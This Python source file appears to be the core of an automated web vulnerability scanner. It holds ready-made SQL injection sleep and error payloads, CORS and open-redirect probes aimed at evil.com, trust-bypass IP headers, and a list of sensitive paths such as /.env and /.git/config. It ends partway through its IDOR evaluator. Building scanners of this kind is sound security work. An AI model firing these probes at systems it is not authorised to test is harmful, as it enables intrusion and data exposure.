"""
hunt_engine.py — Automated Vulnerability Hunt Engine v2
28 hunt classes + Parameter Mining + Web Cache Deception.
Upgraded: time-based SQLi, XSS context tracking, structural IDOR,
          expanded SSRF/Auth headers, WAF-aware throttling.
"""

import asyncio
import contextvars
import copy
import html
import re
import json
import secrets
import socket
import time
import httpx
from typing import Callable
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, unquote
from collections import Counter, defaultdict

from utils import (
    prune_http_for_llm, extract_xss_context,
    extract_sqli_context, structural_json_diff,
)
from waf_engine import throttle
from oob_engine import (
    oob, CTX_SSRF_PARAM, CTX_SQLI_BLIND, CTX_RCE_PARAM, CTX_BLIND_XSS,
)
from dual_session import auth_matrix
from idor_proof_engine import prove_idor
from xss_proof_engine import prove_xss
from graphql_auth_tester import test_graphql_auth
from jwt_attack_suite import test_jwt
from oauth_tester import test_oauth_flow
from behavioral_anomaly_detector import detect_anomalies
from prototype_pollution_tester import test_prototype_pollution
from request_smuggling_detector import detect_smuggling
from api_version_tester import test_api_versions
from websocket_tester import test_websocket_security
from security_hardening import redact_secrets
from scope_policy import scope_policy
from finding_model import normalize_finding
from adaptive_scan import ResourceController

# ── Shared config ─────────────────────────────────────────────────────────────
BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept":     "application/json, text/html, */*",
}
TIMEOUT      = httpx.Timeout(12.0)
MAX_CONC     = 8   # reduced from 10 — more polite default
REQUEST_TIMEOUT = contextvars.ContextVar(
    "burpollama_hunt_timeout", default=TIMEOUT
)

# ── Infrastructure-trust bypass headers (Classes 8 & 9) ──────────────────────
INFRA_TRUST_HEADERS = [
    {"X-Forwarded-For":           "127.0.0.1"},
    {"X-Forwarded-For":           "169.254.169.254"},
    {"True-Client-IP":            "127.0.0.1"},
    {"Client-IP":                 "127.0.0.1"},
    {"X-Real-IP":                 "127.0.0.1"},
    {"CF-Connecting-IP":          "127.0.0.1"},
    {"X-Original-URL":            "/"},
    {"X-Rewrite-URL":             "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host":          "localhost"},
    {"X-Host":                    "127.0.0.1"},
    {"Forwarded":                  "for=127.0.0.1;host=localhost"},
]

# ── Finding builder ───────────────────────────────────────────────────────────
def finding(vuln_type, severity, confidence, url, method,
            description, evidence, remediation,
            cwe="", cvss=0.0, extra=None):
    f = {
        "id":          "H-{}-{}".format(int(time.time() * 1000), abs(hash(url + vuln_type)) % 99999),
        "source":      "auto-hunt",
        "vuln_type":   vuln_type,
        "severity":    severity,
        "confidence":  confidence,
        "url":         url,
        "method":      method,
        "description": description,
        "evidence":    str(evidence)[:500],
        "remediation": remediation,
        "cwe":         cwe,
        "cvss":        cvss,
        "triaged":     False,
    }
    if extra:
        f.update(extra)
    return normalize_finding(f)

# ── Throttle-aware GET/POST helpers ──────────────────────────────────────────

async def tget(client, url, **kwargs):
    """
    Fix 1 (v3.4): Network-level errors (timeout, connection reset) call
    record_network_error() which does NOT advance the HOST_DEAD_WAF counter.
    Only HTTP-level WAF responses advance _consecutive_blocks.
    """
    ok, reason = scope_policy.record_request(url, action="active")
    if not ok:
        return None
    async with await throttle.gate():
        await throttle.record_request(url)
        try:
            r = await client.get(url, timeout=REQUEST_TIMEOUT.get(), **kwargs)
            if throttle.is_block_response(r.status_code, r.text[:500]):
                await throttle.record_block(r.status_code, r.text[:200], url, dict(r.headers))
            return r
        except httpx.TimeoutException:
            # Network timeout — retry backoff but NOT a WAF signal
            await throttle.record_network_error(url)
            return None
        except (httpx.ConnectError, httpx.RemoteProtocolError,
                httpx.ReadError, httpx.WriteError):
            # Layer 3/4 failures — also not WAF signals
            await throttle.record_network_error(url)
            return None
        except Exception:
            return None

async def tpost(client, url, **kwargs):
    ok, reason = scope_policy.record_request(url, action="active")
    if not ok:
        return None
    async with await throttle.gate():
        await throttle.record_request(url)
        try:
            r = await client.post(url, timeout=REQUEST_TIMEOUT.get(), **kwargs)
            if throttle.is_block_response(r.status_code, r.text[:500]):
                await throttle.record_block(r.status_code, r.text[:200], url, dict(r.headers))
            return r
        except (httpx.TimeoutException, httpx.ConnectError,
                httpx.RemoteProtocolError, httpx.ReadError):
            await throttle.record_network_error(url)
            return None
        except Exception:
            return None


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 1: Security Headers
# ══════════════════════════════════════════════════════════════════════════════
async def hunt_security_headers(client, url):
    results = []
    r = await tget(client, url)
    if not r: return []
    h = {k.lower(): v for k, v in r.headers.items()}

    checks = [
        ("strict-transport-security", "Missing HSTS",              "MEDIUM", "CWE-319", 5.0,
         "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
        ("content-security-policy",   "Missing CSP",               "MEDIUM", "CWE-79",  5.0,
         "Implement a strict Content-Security-Policy header."),
        ("x-frame-options",           "Missing X-Frame-Options",   "MEDIUM", "CWE-1021",4.3,
         "Add: X-Frame-Options: DENY or SAMEORIGIN"),
        ("x-content-type-options",    "Missing X-Content-Type-Options","LOW","CWE-16",  3.1,
         "Add: X-Content-Type-Options: nosniff"),
        ("permissions-policy",        "Missing Permissions-Policy","LOW",    "CWE-16",  2.5,
         "Add Permissions-Policy to restrict browser feature access."),
    ]
    missing = [c for c in checks if c[0] not in h and "text/html" in h.get("content-type","")]
    if len(missing) >= 3:
        names = ", ".join(c[1].replace("Missing ","") for c in missing)
        results.append(finding("Missing Security Headers","MEDIUM",92,url,"GET",
            "{} critical headers absent.".format(len(missing)),
            "Absent: {}".format(names),
            "Add security headers in web server / framework config.",
            "CWE-16",4.3))
    elif missing:
        for c in missing:
            results.append(finding(c[1],c[2],88,url,"GET",
                "{} absent.".format(c[0]), "Header '{}' not present".format(c[0]),
                c[5],c[3],c[4]))
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 2: CORS Misconfiguration
# ══════════════════════════════════════════════════════════════════════════════
async def hunt_cors(client, url):
    results = []
    for origin in ["https://evil.com", "null", "https://evil.{}".format(urlparse(url).netloc)]:
        r = await tget(client, url, headers={**BASE_HEADERS, "Origin": origin})
        if not r: continue
        acao = r.headers.get("access-control-allow-origin","")
        acac = r.headers.get("access-control-allow-credentials","").lower()
        if acao == "*":
            results.append(finding("CORS Wildcard","HIGH",95,url,"GET",
                "Access-Control-Allow-Origin: * allows any origin.",
                "ACAO: *",
                "Restrict CORS to specific trusted origins.",
                "CWE-942",7.5)); break
        if origin in acao or acao == origin:
            sev = "CRITICAL" if acac == "true" else "HIGH"
            cvss = 9.1 if acac == "true" else 7.1
            results.append(finding(
                "CORS Origin Reflection" + (" + Credentials" if acac=="true" else ""),
                sev, 92, url, "GET",
                "Server reflects attacker Origin{}.".format(" with credentials" if acac=="true" else ""),
                "ACAO: {} | ACAC: {}".format(acao, acac),
                "Validate Origin against strict server-side whitelist.",
                "CWE-942", cvss)); break
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 3: Open Redirect
# ══════════════════════════════════════════════════════════════════════════════
REDIRECT_PARAMS = ["redirect","next","url","return","returnurl","goto","target",
                   "redir","redirect_uri","continue","dest","r","to","back"]

async def hunt_open_redirect(client, url):
    results = []
    base = url.split("?")[0]
    for param in REDIRECT_PARAMS:
        test_url = "{}?{}=https://evil.com".format(base, param)
        r = await tget(client, test_url, follow_redirects=False)
        if not r: continue
        loc = r.headers.get("location","")
        if "evil.com" in loc:
            results.append(finding("Open Redirect","MEDIUM",90,url,"GET",
                "Param '{}' redirects to attacker URL without validation.".format(param),
                "?{}=https://evil.com → Location: {}".format(param,loc),
                "Whitelist redirect destinations. Prefer relative paths.",
                "CWE-601",6.1)); break
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 4: Sensitive Path Disclosure
# ══════════════════════════════════════════════════════════════════════════════
SENSITIVE_PATHS = [
    ("/.git/HEAD",         "Git Repo Exposed",       "CRITICAL","CWE-538",9.1),
    ("/.git/config",       "Git Config Exposed",     "CRITICAL","CWE-538",9.1),
    ("/.env",              "Env File Exposed",        "CRITICAL","CWE-538",9.1),
    ("/.env.production",   "Env File Exposed",        "CRITICAL","CWE-538",9.1),
    ("/.env.local",        "Env File Exposed",        "CRITICAL","CWE-538",9.1),
    ("/phpinfo.php",       "PHPInfo Exposed",         "HIGH",    "CWE-200",7.5),
    ("/actuator",          "Spring Actuator",         "HIGH",    "CWE-200",7.5),
    ("/actuator/env",      "Actuator Env Exposed",    "CRITICAL","CWE-200",9.1),
    ("/actuator/heapdump", "Actuator Heap Dump",      "CRITICAL","CWE-200",9.1),
    ("/actuator/mappings", "Actuator Route Map",      "HIGH",    "CWE-200",7.5),
    ("/api/swagger.json",  "Swagger API Docs",        "MEDIUM",  "CWE-200",5.3),
    ("/swagger-ui.html",   "Swagger UI",              "MEDIUM",  "CWE-200",5.3),
    ("/openapi.json",      "OpenAPI Schema",          "MEDIUM",  "CWE-200",5.3),
    ("/graphql",           "GraphQL Endpoint",        "MEDIUM",  "CWE-200",5.3),
    ("/graphiql",          "GraphiQL UI",             "MEDIUM",  "CWE-200",5.3),
    ("/backup.sql",        "SQL Dump",                "CRITICAL","CWE-538",9.1),
    ("/dump.sql",          "SQL Dump",                "CRITICAL","CWE-538",9.1),
    ("/web.config",        "Web.config",              "HIGH",    "CWE-538",7.5),
    ("/wp-config.php.bak", "WP Config Backup",        "CRITICAL","CWE-538",9.1),
    ("/.DS_Store",         "DS_Store",                "LOW",     "CWE-538",3.7),
    ("/server-status",     "Apache Status",           "MEDIUM",  "CWE-200",5.3),
    ("/crossdomain.xml",   "Crossdomain XML",         "MEDIUM",  "CWE-942",5.0),
    ("/.well-known/security.txt","Security.txt",      "INFO",    "CWE-200",0.0),
    ("/robots.txt",        "Robots.txt",              "INFO",    "CWE-200",0.0),
]

async def hunt_sensitive_paths(client, base_url):
    results = []
    parsed  = urlparse(base_url)
    base    = "{}://{}".format(parsed.scheme, parsed.netloc)
    sem     = asyncio.Semaphore(10)

    async def check(path, label, severity, cwe, cvss):
        async with sem:
            r = await tget(client, base + path, follow_redirects=False)
            if r and r.status_code == 200 and severity not in ("INFO",):
                results.append(finding(label, severity, 88, base + path, "GET",
                    "'{}' returns HTTP 200.".format(path),
                    "HTTP 200 — {}".format(r.text[:150].replace("\n"," ")),
                    "Block '{}' in web server config.".format(path),
                    cwe, cvss))
            elif r and r.status_code == 200 and severity == "INFO":
                results.append(finding(label, severity, 75, base + path, "GET",
                    "'{}' is publicly accessible.".format(path),
                    "HTTP 200", "Review if {} should be public.".format(path),
                    cwe, cvss))

    await asyncio.gather(*[check(*p) for p in SENSITIVE_PATHS])
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 5: SQL Injection — Error-Based + Conditional Time-Based Blind
#
#  Time-based blind is ONLY fired when:
#    (a) WAF fingerprinting confirmed NO active WAF, OR
#    (b) The parameter name is a high-probability DB identifier
#  This prevents exponential slowdowns under WAF throttling.
# ══════════════════════════════════════════════════════════════════════════════

SQLI_ERROR_PAYLOADS = ["'", '"', "' OR '1'='1", "\\", "''"]
SQLI_TIME_PAYLOADS  = [
    ("MySQL",      "' AND SLEEP(4)-- -",                                          4.0),
    ("PostgreSQL", "'; SELECT pg_sleep(4)-- -",                                   4.0),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:4'-- -",                                4.0),
    ("Oracle",     "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -",               4.0),
]
SQLI_ERRORS = [
    (r"SQL syntax.*MySQL",          "MySQL"),
    (r"Warning.*mysql_",            "MySQL"),
    (r"ORA-\d{5}",                  "Oracle"),
    (r"Microsoft SQL.*Error",       "MSSQL"),
    (r"PostgreSQL.*ERROR",          "PostgreSQL"),
    (r"SQLite.*error",              "SQLite"),
    (r"SQLSTATE\[",                 "ANSI SQL"),
    (r"Unclosed quotation mark",    "MSSQL"),
    (r"syntax error.*sql",          "Generic"),
    (r"pg_query\(\)",               "PostgreSQL"),
    (r"mysql_fetch",                "MySQL"),
    (r"ODBC.*Driver",               "ODBC"),
]

# High-probability param names that DB queries are built around
HIGH_PROB_SQLI_PARAMS = {
    "id", "user_id", "userid", "account_id", "order_id",
    "search", "query", "q", "s", "keyword", "term",
    "sort", "order", "filter", "category", "type",
    "file", "name", "key", "val", "value",
    "product_id", "item_id", "post_id", "page_id",
    "report", "date", "from", "to", "start", "end",
    "username", "email", "login",
}


def _should_run_time_based(param: str, waf_info: dict) -> bool:
    """
    Gate function: return True only if it is safe/worthwhile to fire
    sleep payloads for this parameter.

    Rules:
    1. No WAF detected → always run time-based (safe, fast scan)
    2. WAF detected + param is high-probability DB identifier → run (high-value target)
    3. WAF detected + param is generic → skip (would trigger blocks + add 12s+ per param)
    """
    waf_active = (waf_info or {}).get("detected", False)

    if not waf_active:
        return True   # Rule 1: no WAF — run freely

    # Rule 2: WAF present — only run on high-probability param names
    param_lower = param.lower().strip()
    return param_lower in HIGH_PROB_SQLI_PARAMS


async def _measure_baseline(client, url: str, n: int = 3) -> float:
    """Measure average clean response time for accurate delay thresholds."""
    times = []
    for _ in range(n):
        t0 = time.monotonic()
        r  = await tget(client, url)
        if r:
            times.append(time.monotonic() - t0)
        await asyncio.sleep(0.2)
    return sum(times) / len(times) if times else 2.0


def _json_key_signature(body: str):
    try:
        payload = json.loads(body)
    except (json.JSONDecodeError, ValueError, TypeError):
        return None

    keys = []

    def walk(value, prefix=""):
        if isinstance(value, dict):
            for key, nested in value.items():
                path = "{}.{}".format(prefix, key) if prefix else str(key)
                keys.append(path)
                walk(nested, path)
        elif isinstance(value, list) and value:
            walk(value[0], "{}[]".format(prefix))

    walk(payload)
    return tuple(sorted(keys))


def _sample_group_consistent(values, minimum_tolerance, relative_tolerance):
    if len(values) != 3:
        return False
    average = sum(values) / len(values)
    tolerance = max(minimum_tolerance, abs(average) * relative_tolerance)
    return max(values) - min(values) <= tolerance


async def blind_diff_test(
    client,
    url: str,
    param: str,
    baseline_payload: str,
    test_payload: str,
) -> dict:
    """Run stable three-sample response comparisons for blind input oracles."""
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query, keep_blank_values=True)

    async def sample(payload):
        sizes = []
        timings = []
        structures = []
        for _ in range(3):
            request_params = {key: values[0] for key, values in original_params.items()}
            request_params[param] = payload
            request_url = "{}?{}".format(
                url.split("?")[0],
                urlencode(request_params),
            )
            started = time.monotonic()
            response = await tget(client, request_url)
            elapsed = time.monotonic() - started
            if not response:
                return [], [], []
            body = response.text or ""
            sizes.append(len(body.encode("utf-8", errors="ignore")))
            timings.append(elapsed)
            structures.append(_json_key_signature(body))
            await asyncio.sleep(0.1)
        return sizes, timings, structures

    baseline_sizes, baseline_times, baseline_structures = await sample(baseline_payload)
    test_sizes, test_times, test_structures = await sample(test_payload)

    if len(baseline_sizes) != 3 or len(test_sizes) != 3:
        return {
            "oracle_detected": False,
            "oracle_type": "none",
            "baseline_avg_size": 0,
            "test_avg_size": 0,
            "size_delta": 0,
            "confidence": 0,
        }

    baseline_avg_size = int(round(sum(baseline_sizes) / 3))
    test_avg_size = int(round(sum(test_sizes) / 3))
    size_delta = abs(test_avg_size - baseline_avg_size)
    sizes_consistent = (
        _sample_group_consistent(baseline_sizes, 20, 0.10)
        and _sample_group_consistent(test_sizes, 20, 0.10)
        and all(
            abs(test_size - baseline_avg_size) > 50
            for test_size in test_sizes
        )
    )

    baseline_avg_time = sum(baseline_times) / 3
    test_avg_time = sum(test_times) / 3
    times_consistent = (
        baseline_avg_time > 0
        and test_avg_time > baseline_avg_time * 2
        and _sample_group_consistent(baseline_times, 0.25, 0.40)
        and _sample_group_consistent(test_times, 0.25, 0.40)
        and all(
            test_time > baseline_avg_time * 2
            for test_time in test_times
        )
    )

    baseline_signature = baseline_structures[0]
    test_signature = test_structures[0]
    structure_changed = bool(
        baseline_signature is not None
        and test_signature is not None
        and all(signature == baseline_signature for signature in baseline_structures)
        and all(signature == test_signature for signature in test_structures)
        and baseline_signature != test_signature
    )

    if sizes_consistent and size_delta > 50:
        oracle_type, confidence = "size_oracle", 86
    elif times_consistent:
        oracle_type, confidence = "time_oracle", 92
    elif structure_changed:
        oracle_type, confidence = "structural_change", 88
    else:
        oracle_type, confidence = "none", 0

    return {
        "oracle_detected": oracle_type != "none",
        "oracle_type": oracle_type,
        "baseline_avg_size": baseline_avg_size,
        "test_avg_size": test_avg_size,
        "size_delta": size_delta,
        "confidence": confidence,
    }


async def hunt_sqli(client, url: str, waf_info: dict = None):
    """
    Stage 1 (always):   Error-based SQLi on all parameters.
    Stage 2 (conditional): Time-based blind — only if _should_run_time_based() passes.
    """
    results = []
    parsed  = urlparse(url)
    params  = parse_qs(parsed.query)
    if not params:
        return []

    # ── STAGE 1: Error-based (always runs) ───────────────────────────────────
    for param in list(params.keys())[:5]:
        for payload in SQLI_ERROR_PAYLOADS:
            test_params              = {k: v[0] for k, v in params.items()}
            test_params[param]       = payload
            test_url = "{}?{}".format(url.split("?")[0], urlencode(test_params))
            r = await tget(client, test_url)
            if not r:
                continue
            for pattern, dbms in SQLI_ERRORS:
                m = re.search(pattern, r.text, re.IGNORECASE)
                if m:
                    snippet = extract_sqli_context(r.text, pattern)
                    results.append(finding(
                        "SQL Injection — Error-Based ({})".format(dbms),
                        "CRITICAL", 92, url, "GET",
                        "SQL error in param '{}' with payload `{}`.".format(param, payload),
                        snippet[:400],
                        "Use parameterized queries. Suppress DB errors in production.",
                        "CWE-89", 9.8,
                        {"sqli_dbms": dbms, "sqli_method": "error-based"}
                    ))
                    return results   # error-based confirmed — no need for time-based

        # Suppressed SQL errors can still produce stable size, timing, or JSON
        # structure differences. Compare a clean value with a boolean SQL probe.
        baseline_payload = params.get(param, [""])[0]
        differential = await blind_diff_test(
            client,
            url,
            param,
            baseline_payload,
            "' OR '1'='1",
        )
        if differential.get("oracle_detected"):
            results.append(finding(
                "SQL Injection — Differential Oracle Candidate",
                "HIGH",
                differential.get("confidence", 75),
                url,
                "GET",
                "Parameter '{}' produced a stable {} when SQL syntax was injected.".format(
                    param,
                    differential.get("oracle_type", "response oracle"),
                ),
                json.dumps(differential, ensure_ascii=False),
                "Use parameterized queries and normalize error handling and response behavior.",
                "CWE-89",
                8.1,
                {
                    "sqli_method": "blind-response-differential",
                    "sqli_param": param,
                    "blind_diff": differential,
                    "exploitability_status": "needs_manual_validation",
                    "evidence_strength": "moderate",
                    "false_positive_risk": "medium",
                    "business_impact": "A stable response oracle may allow extraction of database-backed information after manual boolean-pair confirmation.",
                    "reproduction_steps": [
                        "Send the original parameter value three times and record response size and structure.",
                        "Send the supplied SQL probe three times under the same session and headers.",
                        "Confirm the reported oracle remains stable, then test a false boolean condition safely.",
                    ],
                    "redaction_status": "not_required",
                },
            ))
            return results

    # ── STAGE 2: Time-based blind (conditional) ───────────────────────────────
    # Identify which params are eligible
    eligible_params = [
        p for p in list(params.keys())[:5]
        if _should_run_time_based(p, waf_info)
    ]

    if not eligible_params:
        # All params gated out — skip time-based entirely
        return results

    baseline        = await _measure_baseline(client, url)
    sleep_threshold = max(3.0, baseline * 2.5)   # 2.5× baseline AND ≥ 3s absolute

    for param in eligible_params[:3]:
        for dbms, payload, expected_delay in SQLI_TIME_PAYLOADS:
            test_params        = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = "{}?{}".format(url.split("?")[0], urlencode(test_params))

            t0      = time.monotonic()
            r       = await tget(client, test_url)
            elapsed = time.monotonic() - t0

            if not r or elapsed < sleep_threshold:
                continue

            # Confirm with a second probe to rule out network jitter
            t0       = time.monotonic()
            await tget(client, test_url)
            elapsed2 = time.monotonic() - t0

            if elapsed2 >= sleep_threshold:
                results.append(finding(
                    "SQL Injection — Time-Based Blind ({})".format(dbms),
                    "CRITICAL", 85, url, "GET",
                    "Param '{}' → {:.1f}s delay (baseline {:.1f}s) with {} payload. 2× confirmed.".format(
                        param, elapsed, baseline, dbms),
                    "Payload: `{}` → {:.1f}s | threshold {:.1f}s | waf={}".format(
                        payload, elapsed, sleep_threshold,
                        (waf_info or {}).get("vendor", "none")),
                    "Use parameterized queries / prepared statements.",
                    "CWE-89", 9.8,
                    {"sqli_dbms": dbms, "sqli_method": "time-based-blind",
                     "baseline_ms": int(baseline * 1000),
                     "delay_ms":    int(elapsed * 1000),
                     "waf_active":  (waf_info or {}).get("detected", False)}
                ))
                return results

    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 6: XSS — Reflection + Context Tracking
# ══════════════════════════════════════════════════════════════════════════════
XSS_PROBE = "BurpOllamaXSS7x9k"

async def hunt_xss(client, url):
    results = []
    parsed  = urlparse(url)
    params  = parse_qs(parsed.query)
    if not params:
        return []

    for param in list(params.keys())[:6]:
        test_params = {k: v[0] for k, v in params.items()}
        test_params[param] = XSS_PROBE
        test_url = "{}?{}".format(url.split("?")[0], urlencode(test_params))
        r = await tget(client, test_url)
        if not r: continue
        ct = r.headers.get("content-type","")
        if XSS_PROBE not in r.text or "html" not in ct.lower():
            continue

        # Extract reflection context
        snippet = extract_xss_context(r.text, XSS_PROBE)

        # Determine context label for triage
        ctx_match = re.search(r'\[XSS_CONTEXT: ([A-Z_]+)\]', snippet)
        ctx_label = ctx_match.group(1) if ctx_match else "UNKNOWN_CONTEXT"

        proof = await prove_xss(url, param, ctx_label, client)
        proof_status = proof.get("proof_status", "context_only")
        confirmed = bool(
            proof.get("reflection_confirmed")
            and proof.get("injection_context") in {
                "SCRIPT_TAG_CONTEXT",
                "EVENT_HANDLER_ATTRIBUTE",
            }
        )
        exploitability = "confirmed" if confirmed else (
            "probable" if proof_status == "probable" else "candidate"
        )
        evidence_strength = "strong" if confirmed else (
            "moderate" if proof_status == "probable" else "weak"
        )
        confidence = 96 if confirmed else (82 if proof_status == "probable" else 68)
        severity = proof.get("severity", "MEDIUM")
        cvss = 7.2 if severity == "HIGH" else 6.1
        results.append(finding(
            "Reflected XSS — {}".format(ctx_label.replace("_"," ").title()),
            severity, confidence, url, "GET",
            "Param '{}' reflects a harmless proof payload in {} context.".format(
                param,
                proof.get("injection_context", ctx_label),
            ),
            proof.get("cve_note", snippet[:400]),
            "Apply context-aware output encoding. Implement strict CSP.",
            "CWE-79", cvss,
            {
                "xss_context": proof.get("injection_context", ctx_label),
                "xss_param": param,
                "xss_proof": proof,
                "harmless_payload": proof.get("harmless_payload", ""),
                "safe_poc_url": proof.get("safe_poc_url", ""),
                "reproduction_steps": proof.get("reproduction_steps", []),
                "safe_manual_validation_steps": proof.get("reproduction_steps", []),
                "business_impact": "An attacker may execute JavaScript in another user's browser if the reflected payload is delivered.",
                "technical_impact": "Unencoded attacker-controlled input reaches an HTML execution context.",
                "exploitability_status": exploitability,
                "evidence_strength": evidence_strength,
                "false_positive_risk": "low" if confirmed else "medium",
                "redaction_status": "not_required",
            }
        ))
        break
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 7: IDOR — Structural Anomaly Detection
# ══════════════════════════════════════════════════════════════════════════════
IDOR_URL_RE = [
    r"(?i)(/api/v?\d*/)(users?|accounts?|orders?|profiles?|documents?|invoices?|customers?)/(\d+)",
    r"(?i)[?&](user_?id|account_?id|order_?id|doc_?id|uid|pid|cid|id)=(\d+)",
]

async def hunt_idor(client, url):
    results = []
    if (
        auth_matrix.configured
        and scope_policy.config.authenticated_testing_enabled
    ):
        session_a_headers, session_b_headers = auth_matrix.session_headers()
        proof = await prove_idor(
            url,
            session_a_headers,
            session_b_headers,
            client,
        )
        proof_status = proof.get("proof_status", "not_vulnerable")
        if proof_status != "not_vulnerable":
            status_map = {
                "confirmed": "confirmed",
                "probable": "probable",
                "inconsistent_enforcement": "needs_manual_validation",
            }
            confidence_map = {
                "confirmed": 98,
                "probable": 85,
                "inconsistent_enforcement": 72,
            }
            evidence_strength_map = {
                "confirmed": "strong",
                "probable": "moderate",
                "inconsistent_enforcement": "weak",
            }
            sensitive = proof.get("sensitive_keys_exposed", [])
            results.append(finding(
                "IDOR/BOLA - Dual Session Proof",
                "CRITICAL" if proof_status == "confirmed" else "HIGH",
                confidence_map[proof_status],
                url,
                "GET",
                "Session A authorization test returned proof status '{}' for a Session B resource.".format(
                    proof_status
                ),
                json.dumps(proof.get("evidence_pair", {}), ensure_ascii=True),
                "Enforce server-side object ownership and tenant authorization on every request.",
                "CWE-639",
                9.1 if proof_status == "confirmed" else 7.5,
                {
                    "exploitability_status": status_map[proof_status],
                    "evidence_strength": evidence_strength_map[proof_status],
                    "false_positive_risk": "low" if proof_status == "confirmed" else "medium",
                    "business_impact": "An attacker may access another user's sensitive object data.",
                    "technical_impact": "Object-level authorization is missing or inconsistently enforced.",
                    "reproduction_steps": proof.get("reproduction_steps", []),
                    "safe_manual_validation_steps": proof.get("reproduction_steps", []),
                    "sensitive_keys": sensitive,
                    "idor_proof": proof,
                    "poc_curl": proof.get("poc_curl", ""),
                    "redaction_status": "redacted",
                },
            ))
            return results

    for pattern in IDOR_URL_RE:
        m = re.search(pattern, url)
        if not m:
            continue
        original_id = m.group(m.lastindex)
        try:
            oid = int(original_id)
        except ValueError:
            continue

        r_orig = await tget(client, url)
        if not r_orig or r_orig.status_code != 200:
            continue

        orig_body = r_orig.text

        for delta in [-1, 1, 100, 9999]:
            new_id   = oid + delta
            if new_id <= 0:
                continue
            test_url = url.replace(original_id, str(new_id), 1)
            r_mod    = await tget(client, test_url)
            if not r_mod:
                continue

            verdict = _evaluate_idor(orig_body, r_orig.status_code,
                                     r_mod.text,  r_mod.status_code,
                                     original_id, new_id)
            if verdict:
                results.append(finding(
                    verdict["vuln_type"],
                    verdict["severity"],
                    verdict["confidence"],
                    url, "GET",
                    verdict["description"],
                    verdict["evidence"],
                    "Implement server-side authorization on every object access. Use UUIDs.",
                    "CWE-639", 7.5,
                    {"idor_original_id": original_id,
                     "idor_tested_id":   str(new_id),
                     "sensitive_keys":   verdict.get("sensitive_keys", [])}
                ))
                return results
        break
    return results


def _evaluate_idor(
    orig_body: str, orig_status: int,
    mod_body:  str, mod_status:  int,
    orig_id:   str, test_id:     int,
) -> dict:
    """
    v3.3: Multi-signal IDOR evaluator.

    Detects four patterns that the old structural-diff-only approach missed:

    Pattern A — Classic: both 200, same structure, different data (original logic).
    Pattern B — Structure discrepancy: orig has populated resource, mod returns
                an error-shaped payload {"status":"error"} or {"message":"..."}.
                The DIFFERENT structure is the evidence of authorization rejection
                being applied inconsistently (one ID returns data, another returns
                an error object instead of a proper 403).
    Pattern C — Empty object: orig has data, mod returns {} or {"data": null}.
    Pattern D — Status-code flip: orig 200 with real data, mod returns 401/403.
                This is actually the strongest possible IDOR signal — the server
                IS enforcing access control but only on some IDs, not all.
    """
    import json as _json

    # ── Parse JSON where possible ─────────────────────────────────────────────
    orig_json, mod_json = None, None
    try:
        orig_json = _json.loads(orig_body)
    except Exception:
        pass
    try:
        mod_json = _json.loads(mod_body)
    except Exception:
        pass

    # ── Pattern D: Status-code flip ───────────────────────────────────────────
    # orig_id → 200 (data), test_id → 401/403 (server enforcing on THIS id)
    # BUT another id gets through → inconsistent enforcement = IDOR surface
    if orig_status == 200 and mod_status in (401, 403):
        # Server is enforcing on test_id but not orig_id → likely test_id belongs
        # to a different user and access control is inconsistently applied
        orig_has_data = bool(orig_body and orig_body.strip() not in ("{}", "[]", "null"))
        if orig_has_data:
            return {
                "vuln_type":   "IDOR — Inconsistent Access Control (Status Flip)",
                "severity":    "HIGH",
                "confidence":  82,
                "description": (
                    "ID {} returns HTTP 200 with data but ID {} returns HTTP {}. "
                    "Inconsistent authorization — server enforces access control "
                    "on some IDs but not all. The original ID may belong to another user."
                    .format(orig_id, test_id, mod_status)
                ),
                "evidence": "ID {} → 200 ({} bytes) | ID {} → {}".format(
                    orig_id, len(orig_body), test_id, mod_status),
                "sensitive_keys": [],
            }

    # ── Only compare 200-vs-200 from here ────────────────────────────────────
    if orig_status != 200 or mod_status != 200:
        return {}

    # ── Pattern C: Empty-object / null response ───────────────────────────────
    if mod_json is not None:
        mod_is_empty = (
            mod_json == {}
            or mod_json == []
            or mod_json == {"data": None}
            or mod_json == {"data": {}}
            or (isinstance(mod_json, dict) and
                mod_json.get("data") is None and len(mod_json) == 1)
        )
        orig_has_real_data = (
            isinstance(orig_json, dict) and
            bool(orig_json) and
            orig_json not in ({}, {"data": None})
        )
        if mod_is_empty and orig_has_real_data:
            return {
                "vuln_type":   "IDOR — Null/Empty Response on ID Swap",
                "severity":    "HIGH",
                "confidence":  78,
                "description": (
                    "ID {} returns populated data but ID {} returns an empty/null "
                    "response body at HTTP 200. The server should return 403, not "
                    "silently empty the payload — indicates partial authorization leak."
                    .format(orig_id, test_id)
                ),
                "evidence": "ID {} → {} bytes | ID {} → {}".format(
                    orig_id, len(orig_body), test_id, mod_body[:80]),
                "sensitive_keys": [],
            }

    # ── Pattern B: Structure discrepancy (error payload on ID swap) ──────────
    if orig_json is not None and mod_json is not None:
        orig_is_resource = (
            isinstance(orig_json, dict) and
            not any(k in orig_json for k in ("status", "error", "message", "detail"))
            and len(orig_json) >= 2
        )
        mod_is_error = (
            isinstance(mod_json, dict) and
            any(k in mod_json for k in ("status", "error", "message", "detail", "code"))
        )
        if orig_is_resource and mod_is_error:
            return {
                "vuln_type":   "IDOR — Structure Discrepancy (Error Payload on ID Swap)",
                "severity":    "HIGH",
                "confidence":  80,
                "description": (
                    "ID {} returns a populated resource object but ID {} returns an "
                    "error-structured payload {} at HTTP 200. "
                    "Server should return 403 — error payload in 200 response "
                    "indicates broken access control surface."
                    .format(orig_id, test_id, list(mod_json.keys())[:3])
                ),
                "evidence": "ID {} → keys:{} | ID {} → error keys:{}".format(
                    orig_id, list(orig_json.keys())[:4],
                    test_id, list(mod_json.keys())[:4]),
                "sensitive_keys": [],
            }

